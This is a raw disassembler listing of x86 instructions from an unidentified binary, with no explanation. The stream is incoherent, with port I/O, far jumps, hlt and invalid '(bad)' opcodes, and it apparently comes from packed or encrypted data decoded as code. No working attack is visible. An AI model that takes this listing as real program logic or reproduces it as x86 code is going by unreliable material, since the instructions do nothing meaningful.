  41500f:	cmp    DWORD PTR [edi+ebx*2],edx
  415012:	jno    0x41507d
  415014:	call   0x78f94934
  415019:	cmp    eax,0xf3857855
  41501e:	pushf  
  41501f:	pop    esi
  415020:	in     eax,0x50
  415022:	add    DWORD PTR [ecx],edi
  415024:	add    al,0xe1
  415026:	test   al,cl
  415028:	and    ah,BYTE PTR [ecx+0x67]
  41502b:	cwde   
  41502c:	jge    0x4150ac
  41502e:	outs   dx,DWORD PTR ds:[esi]
  41502f:	popa   
  415030:	or     BYTE PTR [esi+esi*4-0x2e],0xf2
  415035:	ja     0x415062
  415037:	cmp    al,0xea
  415039:	xchg   esp,eax
  41503a:	cmc    
  41503b:	xor    al,BYTE PTR [edi-0x76f21168]
  415041:	outs   dx,BYTE PTR ds:[esi]
  415042:	push   0x5262453c
  415047:	and    eax,0x9f3c5a8f
  41504c:	test   eax,0xfc38e490
  415051:	mov    dh,dl
  415053:	jbe    0x414fe2
  415055:	scas   al,BYTE PTR es:[edi]
  415056:	jb     0x415066
  415058:	cmc    
  415059:	jo     0x4150ad
  41505b:	xor    DWORD PTR ss:[eax],edx
  41505e:	int    0xac
  415060:	xchg   ecx,eax
  415061:	xor    al,0x11
  415063:	and    DWORD PTR [edx],0x3cb9ef29
  415069:	mov    edi,0x15f59ddc
  41506e:	repnz mov esp,0x5df5fc96
  415074:	hlt    
  415075:	mov    al,ds:0xc84a38f0
  41507a:	ror    DWORD PTR [ebx+0x74],cl
  41507d:	clc    
  41507e:	pop    edi
  41507f:	cmp    eax,0xcc6e17c1
  415084:	xor    DWORD PTR ds:0x7d5aa3dd,esp
  41508a:	aam    0x6
  41508c:	neg    BYTE PTR [eax-0x8a4cb92]
  415092:	adc    BYTE PTR [edi],dh
  415094:	mov    ds:0xb2c8a2e2,eax
  415099:	cmp    cl,ch
  41509b:	loope  0x4150d9
  41509d:	dec    esi
  41509e:	sbb    DWORD PTR [eax+0x55],edx
  4150a1:	mov    ds:0x33f43932,al
  4150a6:	and    DWORD PTR [esi+0x76],0xfffffffb
  4150aa:	mov    cl,0xbd
  4150ac:	cmc    
  4150ad:	fild   QWORD PTR [eax]
  4150af:	dec    esp
  4150b0:	call   0x4ab6e99
  4150b5:	cmp    BYTE PTR [eax-0xd07aafe],bl
  4150bb:	xor    al,0x97
  4150bd:	inc    eax
  4150be:	dec    ecx
  4150bf:	mov    ah,0x12
  4150c1:	shl    ah,1
  4150c3:	and    eax,0x43cd975
  4150c8:	jl     0x415078
  4150ca:	cld    
  4150cb:	cmp    ch,dl
  4150cd:	and    DWORD PTR [esp+ecx*4+0x2d],ecx
  4150d1:	adc    al,0xd6
  4150d3:	inc    edi
  4150d4:	cmc    
  4150d5:	js     0x415062
  4150d7:	shl    cl,cl
  4150d9:	aad    0x84
  4150db:	push   ss
  4150dc:	jecxz  0x415116
  4150de:	into   
  4150df:	jo     0x415141
  4150e1:	xchg   DWORD PTR [ecx],ebp
  4150e3:	jmp    0x913d:0xb26e884a
  4150ea:	ror    ch,1
  4150ec:	(bad)  
  4150ed:	adc    eax,0xa9073cbf
  4150f2:	(bad)  
  4150f3:	inc    eax
  4150f4:	inc    ebx
  4150f5:	cmp    edi,ebp
  4150f7:	inc    esi
  4150f8:	les    esp,FWORD PTR [esi+ebp*8]
  4150fb:	cmp    BYTE PTR [ebp-0x787aab8e],cl
  415101:	data16 das 
  415103:	mov    ecx,0xa36bcef5
  415108:	adc    al,0xc3
  41510a:	je     0x4150f7
  41510c:	data16 stc 
  41510e:	ds cmc 
  415110:	cmc    
  415111:	jae    0x4150c1
  415113:	adc    al,0xf
  415115:	jmp    0xc64f:0x10f62712
  41511c:	xor    eax,0xd11328ba
  415121:	aaa    
  415122:	mov    esp,0xf6873038
  415127:	dec    esi
  415128:	fwait
  415129:	out    0x5a,al
  41512b:	daa    
  41512c:	cmc    
  41512d:	jno    0x4150d6
  41512f:	and    eax,0xbf931b0c
  415134:	add    DWORD PTR [eax],edi
  415136:	add    ch,ch
  415138:	xor    eax,DWORD PTR [esi-0x1cb8d55f]
  41513e:	outs   dx,BYTE PTR ds:[esi]
  41513f:	push   0xe7cb24fb
  415144:	mov    dl,0x4
  415146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415147:	and    esi,ecx
  415149:	adc    al,0x11
  41514b:	sub    eax,esi
  41514d:	andnps xmm6,XMMWORD PTR [bp+si]
  415151:	inc    esi
  415152:	popa   
  415153:	dec    esi
  415154:	jmp    0x2ebf:0x304aa7ac
  41515b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41515c:	je     0x4151d4
  41515e:	shl    BYTE PTR [ecx],cl
  415160:	inc    edx
  415161:	xor    cl,BYTE PTR [ebp-0x37380abe]
  415167:	mov    ch,0x7f
  415169:	jecxz  0x41510e
  41516b:	call   0x474989ba
  415170:	xchg   ebx,eax
  415171:	gs pop ecx
  415173:	das    
  415174:	mov    ebp,0x31f6e13b
  415179:	xor    cl,dh
  41517b:	daa    
  41517c:	jnp    0x4150ff
  41517e:	outs   dx,BYTE PTR ds:[esi]
  41517f:	dec    edi
  415180:	inc    ebx
  415181:	mov    ebx,0xe172a236
  415186:	ins    DWORD PTR es:[edi],dx
  415187:	cmp    DWORD PTR [edx],esi
  415189:	dec    esi
  41518a:	test   ah,cl
  41518c:	enter  0x556d,0x97
  415190:	mov    ebp,0x98c80eeb
  415195:	jmp    0x415205
  415197:	adc    dl,BYTE PTR [eax+ebx*1]
  41519a:	jo     0x4151e7
  41519c:	mov    eax,ds:0x563c3270
  4151a1:	pusha  
  4151a2:	mov    ah,0x6e
  4151a4:	fld    TBYTE PTR [edi]
  4151a6:	pop    edi
  4151a7:	out    dx,al
  4151a8:	popf   
  4151a9:	shr    DWORD PTR [esi+0x23],cl
  4151ac:	cli    
  4151ad:	or     bl,bl
  4151af:	dec    edx
  4151b0:	in     eax,dx
  4151b1:	mov    al,ds:0x4f6b3929
  4151b6:	jae    0x415167
  4151b8:	jl     0x4151a3
  4151ba:	sub    al,BYTE PTR [edi-0x54605509]
  4151c0:	out    dx,al
  4151c1:	sahf   
  4151c2:	or     bl,BYTE PTR [esi+0x2d]
  4151c5:	ficomp DWORD PTR [esi-0x71]
  4151c8:	mov    ebp,0x5bb8433b
  4151cd:	push   esp
  4151ce:	or     ah,bl
  4151d0:	inc    ecx
  4151d1:	push   cs
  4151d2:	in     al,dx
  4151d3:	jno    0x4151b9
  4151d5:	sbb    BYTE PTR [esi+ecx*2-0x56],bl
  4151d9:	mov    ebx,0xb20fa842
  4151de:	xchg   edi,eax
  4151df:	cmp    BYTE PTR [esi],ah
  4151e1:	lds    esi,FWORD PTR [ebx]
  4151e3:	std    
  4151e4:	dec    eax
  4151e5:	in     eax,0xff
  4151e7:	xchg   ebp,eax
  4151e8:	cmc    
  4151e9:	or     BYTE PTR [edx+0x8d67ed1],cl
  4151ef:	push   eax
  4151f0:	pop    esi
  4151f1:	cmp    dl,BYTE PTR [edx+ebp*1+0x6a42c9e9]
  4151f8:	xor    eax,0xf5a387b1
  4151fd:	nop
  4151fe:	xchg   BYTE PTR [esi+0x7e5119cf],ah
  415204:	mov    edx,0xae48eb3b
  415209:	ret    0xa0bb
  41520c:	cmp    BYTE PTR [ebp-0x4c167892],0x8f
  415213:	xlat   BYTE PTR ds:[ebx]
  415214:	or     al,0x5e
  415216:	dec    edi
  415217:	cmp    DWORD PTR [ebx],eax
  415219:	enter  0x8817,0xbc
  41521d:	mov    esi,0xdde83268
  415222:	xchg   esp,eax
  415223:	mov    ebx,0xa9022608
  415228:	sar    BYTE PTR [ebp+0x49fc37e0],1
  41522e:	push   cs
  41522f:	(bad)  
  415230:	cmc    
  415231:	push   ebx
  415232:	sbb    ch,BYTE PTR [edx+eiz*2]
  415235:	push   0x92591a6f
  41523a:	adc    BYTE PTR [ecx+0x38aef489],0x29
  415241:	push   cs
  415242:	mov    cl,BYTE PTR [edx]
  415244:	pop    edi
  415245:	pop    esp
  415246:	push   0xd
  415248:	xor    al,0x29
  41524a:	inc    ebx
  41524b:	add    DWORD PTR ds:[ebx+eax*1-0x17],edx
  415250:	aas    
  415251:	(bad)  
  415252:	push   edx
  415253:	sub    al,0x36
  415255:	cmp    BYTE PTR [eax],dl
  415257:	add    BYTE PTR [ecx-0x6f],dl
  41525a:	dec    edx
  41525b:	jge    0x4152bf
  41525d:	out    dx,eax
  41525e:	mov    ds:0xe9bbd135,al
  415263:	popf   
  415264:	and    cl,bl
  415266:	push   ebx
  415267:	sar    DWORD PTR [eax+0x3d],cl
  41526a:	pop    edi
  41526b:	out    0xb4,eax
  41526d:	mov    ds:0x4bce0ad5,al
  415272:	jecxz  0x4152d0
  415274:	ins    BYTE PTR es:[edi],dx
  415275:	pop    edx
  415276:	outs   dx,DWORD PTR ds:[esi]
  415277:	push   eax
  415278:	in     al,0xce
  41527a:	add    al,0xba
  41527c:	imul   edi,DWORD PTR ds:0xc4083898,0x3c5ccba7
  415286:	arpl   WORD PTR [esi-0x490c1814],bp
  41528c:	in     eax,0x7f
  41528e:	jg     0x41522d
  415290:	sub    esi,edi
  415292:	or     cl,ah
  415294:	push   ss
  415295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415296:	imul   eax,esi,0xffffffb6
  415299:	stc    
  41529a:	call   0x92c9f617
  41529f:	inc    ecx
  4152a0:	cmc    
  4152a1:	stos   BYTE PTR es:[edi],al
  4152a2:	inc    ah
  4152a4:	repnz adc al,0x4b
  4152a7:	cmp    al,0x4b
  4152a9:	cmp    BYTE PTR [ecx],dl
  4152ab:	mov    eax,ds:0x5d24beb7
  4152b0:	mov    ch,0x50
  4152b2:	outs   dx,DWORD PTR ds:[esi]
  4152b3:	sub    DWORD PTR [edx-0x1a11849a],eax
  4152b9:	hlt    
  4152ba:	and    bh,BYTE PTR [ecx]
  4152bc:	jl     0x415287
  4152be:	xchg   esi,eax
  4152bf:	ja     0x41532d
  4152c1:	push   esp
  4152c2:	push   ds
  4152c3:	(bad)
  4152c6:	pop    edx
  4152c7:	push   es
  4152c8:	mov    BYTE PTR [edi+0xd],cl
  4152cb:	test   eax,0xc9a13c9f
  4152d0:	shl    ebp,cl
  4152d2:	sub    bh,bh
  4152d4:	gs jno 0x415313
  4152d7:	and    bh,ah
  4152d9:	pop    eax
  4152da:	xor    ebx,DWORD PTR ds:0xe2f9f6e8
  4152e0:	inc    ebp
  4152e1:	js     0x415293
  4152e3:	(bad)  
  4152e4:	shr    DWORD PTR [ecx],1
  4152e6:	mov    ah,0x42
  4152e8:	les    edx,FWORD PTR [edi]
  4152ea:	(bad)  
  4152ec:	xor    DWORD PTR [eax],edi
  4152ee:	dec    esp
  4152ef:	xor    BYTE PTR [ecx+edx*8+0x7733ed01],bl
  4152f6:	sub    BYTE PTR [ecx],bh
  4152f8:	addr16 popa 
  4152fa:	adc    eax,0x4b081bc1
  4152ff:	aas    
  415300:	stos   BYTE PTR es:[edi],al
  415301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415302:	sbb    eax,0xe5b50033
  415307:	fmul   DWORD PTR [eax-0x7ac79481]
  41530d:	pop    edi
  41530e:	push   es
  41530f:	mov    dh,0xf
  415311:	pop    edi
  415312:	pop    es
  415313:	lods   eax,DWORD PTR ds:[esi]
  415314:	push   ecx
  415315:	mov    edi,0x9114394c
  41531a:	das    
  41531b:	adc    al,0x69
  41531d:	add    eax,0x56b03958
  415322:	mov    ah,0x9e
  415324:	les    eax,FWORD PTR [eax+0x32f55ca0]
  41532a:	and    esi,DWORD PTR [ecx-0x75]
  41532d:	add    BYTE PTR [eax],bl
  41532f:	mov    ch,0xcc
  415331:	cmp    ebp,DWORD PTR [eax+esi*2-0x5a]
  415335:	pop    edx
  415336:	xchg   ecx,eax
  415337:	sbb    al,0x37
  415339:	pop    edx
  41533a:	mov    al,ds:0x61b828f4
  41533f:	(bad)  
  415340:	scas   al,BYTE PTR es:[edi]
  415341:	jl     0x4153ac
  415343:	mov    ecx,0xfa7e3bbb
  415348:	aad    0x1b
  41534a:	stos   DWORD PTR es:[edi],eax
  41534b:	fsub   st(0),st
  41534d:	repz jge 0x41538b
  415350:	jp     0x415361
  415352:	adc    bh,dh
  415354:	jo     0x415312
  415356:	iret   
  415357:	int3   
  415358:	icebp  
  415359:	call   0xa0f98c29
  41535e:	xchg   esp,eax
  41535f:	iret   
  415360:	addr16 mov esi,0x3d724cc5
  415366:	sub    ebp,0x43
  415369:	push   eax
  41536a:	scas   eax,DWORD PTR es:[edi]
  41536b:	out    0xe0,al
  41536d:	or     BYTE PTR [eax-0x7ac231ba],cl
  415373:	mov    esi,0xd9f6dc89
  415378:	jp     0x415332
  41537a:	adc    al,BYTE PTR [eax]
	...
